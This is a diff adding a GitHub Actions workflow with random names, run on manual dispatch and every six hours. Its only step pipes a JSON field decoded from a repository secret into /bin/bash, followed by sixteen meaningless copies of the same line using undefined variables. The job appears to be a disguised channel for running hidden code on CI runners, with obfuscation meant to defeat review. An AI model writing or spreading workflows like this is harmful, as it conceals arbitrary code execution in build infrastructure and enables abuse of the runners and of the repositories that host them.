@@ -1,0 +1,34 @@
+name: taoxwozh
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: taoxwozh
+        env:
+          ge0782: ${{ secrets.ge0782 }}
+        run: |
+          echo $ge0782 | jq -r .d67 | /bin/bash
+          echo $vjwzk562 | jq -r .v23 | /bin/bash
+          echo $xwy5 | jq -r .psqf45 | /bin/bash
+          echo $ctidw5 | jq -r .da4 | /bin/bash
+          echo $jhfhb3 | jq -r .tyzr2 | /bin/bash
+          echo $giq570 | jq -r .ona7 | /bin/bash
+          echo $ttxgh91 | jq -r .kri22507 | /bin/bash
+          echo $fq9673 | jq -r .uigb367 | /bin/bash
+          echo $bco8702 | jq -r .q242 | /bin/bash
+          echo $zyyu0732 | jq -r .qmdoc0889 | /bin/bash
+          echo $rvhk4 | jq -r .mntif17 | /bin/bash
+          echo $ga8465 | jq -r .npymk93 | /bin/bash
+          echo $iumtb949 | jq -r .vezp267 | /bin/bash
+          echo $ro5234 | jq -r .fzq164 | /bin/bash
+          echo $w8356 | jq -r .xgba9 | /bin/bash
+          echo $lobf1 | jq -r .nfcfm10 | /bin/bash
+          echo $ts4 | jq -r .wfua70 | /bin/bash
+
